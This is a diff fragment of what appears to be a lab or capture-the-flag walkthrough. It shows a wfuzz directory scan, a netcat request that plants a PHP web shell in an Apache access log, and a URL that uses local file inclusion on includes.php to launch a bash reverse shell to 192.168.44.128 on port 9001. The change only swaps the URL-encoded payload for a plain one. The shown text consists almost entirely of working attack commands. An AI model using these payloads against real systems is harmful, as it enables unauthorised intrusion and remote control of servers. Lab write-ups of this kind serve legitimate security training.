@@ -41,5 +41,5 @@ wfuzz -c --hc=404 --hh=2 -t 100 -w /usr/share/wordlists/dirbuster/directory-list
 └─$ nc 192.168.18.238 80
 GET <?php system($_GET['cmd']); ?>
 
-http://192.168.18.238/includes.php?display_page=/var/log/apache2/access.log&cmd=bash+-c+%27bash+-i+%3E%26/dev/tcp/192.168.44.128/9001+0%3E%261%27
+http://192.168.18.238/includes.php?display_page=/var/log/apache2/access.log&cmd=bash -i >& /dev/tcp/192.168.44.128/9001 0>&1
 ```
